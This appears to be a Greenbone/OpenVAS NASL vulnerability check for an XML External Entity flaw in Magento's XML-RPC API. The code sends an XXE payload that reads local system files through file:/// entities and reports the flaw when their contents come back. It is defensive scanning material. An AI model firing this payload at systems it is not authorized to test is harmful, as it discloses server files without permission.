CPE = "cpe:/a:magentocommerce:magento";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103518" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Magento eCommerce Local File Disclosure" );
	script_xref( name: "URL", value: "http://bot24.blogspot.de/2012/07/sec-consult-sa-20120712-0-magento.html" );
	script_xref( name: "URL", value: "http://www.magentocommerce.com/blog/comments/update-zend-framework-vulnerability-security-update/" );
	script_xref( name: "URL", value: "http://www.magentocommerce.com/download" );
	script_xref( name: "URL", value: "http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.0.0-1.4.1.1.patch" );
	script_xref( name: "URL", value: "http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.2.0.patch" );
	script_xref( name: "URL", value: "http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.5.0.0-1.7.0.1.patch" );
	script_xref( name: "URL", value: "https://www.magentocommerce.com/products/customer/account/index/" );
	script_tag( name: "summary", value: "Magento eCommerce platform uses a vulnerable version of Zend framework which
 is prone to XML eXternal Entity Injection attacks. The SimpleXMLElement class of
 Zend framework (SimpleXML PHP extension) is used in an insecure way to parse
 XML data. External entities can be specified by adding a specific DOCTYPE
 element to XML-RPC requests. By exploiting this vulnerability an application
 may be coerced to open arbitrary files and/or TCP connections." );
	script_tag( name: "solution", value: "Updates are available. Please see the references for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-07-16 10:24:55 +0200 (Mon, 16 Jul 2012)" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_dependencies( "sw_magento_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "magento/installed" );
	script_tag( name: "qod_type", value: "remote_active" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = get_host_name();
files = traversal_files();
url = dir + "/api/xmlrpc";
for file in keys( files ) {
	ex = "<?xml version=\"1.0\"?>
   <!DOCTYPE foo [
   <!ELEMENT methodName ANY >
   <!ENTITY xxe SYSTEM \"file:///" + files[file] + "\" >]>
  <methodCall>
    <methodName>&xxe;</methodName>
  </methodCall>";
	len = strlen( ex );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Length: ", strlen( ex ), "\\r\\n\\r\\n", ex );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(egrep( pattern: file, string: result )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

